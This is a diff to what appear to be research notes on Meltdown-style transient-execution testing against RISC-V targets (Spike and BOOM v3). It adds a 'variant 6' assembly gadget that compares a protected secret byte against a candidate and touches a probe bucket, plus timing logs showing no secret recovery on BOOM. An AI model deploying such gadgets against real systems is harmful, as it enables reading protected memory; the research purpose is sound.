@@ -1184,6 +1184,49 @@ The current best interpretation is that PMP/M-mode-skip can expose a weak
 younger-load footprint, but BOOM v3 still does not forward the protected secret
 byte through the tested dependent probe-address chains.
 
+Variant 6 adds a candidate-compare branch gadget:
+
+```asm
+lbu  t0, 0(secret_va)
+li   t2, 0x53
+bne  t0, t2, 1f
+touch probe[0x53]
+1:
+```
+
+This keeps the touched bucket fixed but makes the decision to touch it depend
+on whether the transient secret byte compares equal to candidate `0x53`. Spike
+passes the PMP/M-mode-skip smoke build:
+
+```text
+MELTDOWN_US_PMP_FAULT=1
+MELTDOWN_US_MMODE_FAULT_SKIP=1
+MELTDOWN_US_GADGET_VARIANT=6
+MELTDOWN_US_DEBUG_ONLY=1
+MELTDOWN_US_TIME_REPS=8
+MELTDOWN_US_CAL_REPS=5
+meltdown-us: timing hit=68 miss=68 threshold=68
+meltdown-us: pmp training value=0x53
+meltdown-us: pmp deny armed
+meltdown-us: raw attempt=0 i53=68 ...
+meltdown-us: done
+SPIKE: PASS
+```
+
+BOOM v3 remains negative:
+
+```text
+log: targets/boom/logs/MediumBoomV3Config-minios-meltdown-us-pmp-mskip-c1-var6-debugonly-r8-a1.log
+meltdown-us: timing hit=210 miss=305 threshold=257
+meltdown-us: raw attempt=0 i53=260 i0=287 i80=294 i1=257 i55=316 i51=251 i56=250 i50=250 i54=250 i52=250
+meltdown-us: fault recovery ok
+meltdown-us: done
+real 360.87
+```
+
+Because `i53=260` is above threshold and several control buckets are lower, the
+candidate-compare gadget cannot yet be counted as secret recovery.
+
 ## Next Step
 
 The current patch establishes the OS privilege conditions needed for
@@ -1202,7 +1245,7 @@ than only increasing delay or timing repetitions. Candidate directions:
    younger loads too early; variant 4 only produces weak near-threshold fixed
    buckets under A-bit faulting, while the PMP/M-mode-skip path can produce a
    fixed-bucket hit but still does not leak through secret-dependent variants 0
-   2, or 5.
+   2, 5, or 6.
 2. Add a one-attempt full 256-bucket scan only after the debug-only selected
    buckets show `i53` clearly below threshold.
 3. Keep `CPUS=1`, `MELTDOWN_US_NPROC=4`, `GADGET_DELAY=0`,
